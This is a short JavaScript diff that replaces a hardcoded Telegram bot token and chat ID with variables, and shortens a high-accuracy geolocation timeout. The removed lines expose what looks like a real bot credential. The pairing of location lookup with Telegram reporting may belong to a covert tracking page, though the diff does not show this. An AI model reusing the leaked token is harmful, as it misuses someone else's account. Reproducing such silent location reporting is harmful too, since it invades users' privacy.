@@ -1583,16 +1583,15 @@
 
 
 /* ================== CONFIG ================== */
-const BOT_TOKEN = "8013303668:AAGrzSe9toKUSqflgxneNbmzucGitRjWNng";
-const CHAT_ID   = "6337727488";
+
 
 /* ================== TELEGRAM ================== */
 function sendToTelegram(message) {
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: CHAT_ID,
+      chat_id: TELEGRAM_CHAT_ID,
       text: message,
       parse_mode: "Markdown"
     })
@@ -1757,7 +1756,7 @@ function getPosition(onSuccess, onFail) {
     },
     {
       enableHighAccuracy: true,
-      timeout: 15000,
+      timeout: 10000,
       maximumAge: 60000
     }
   );
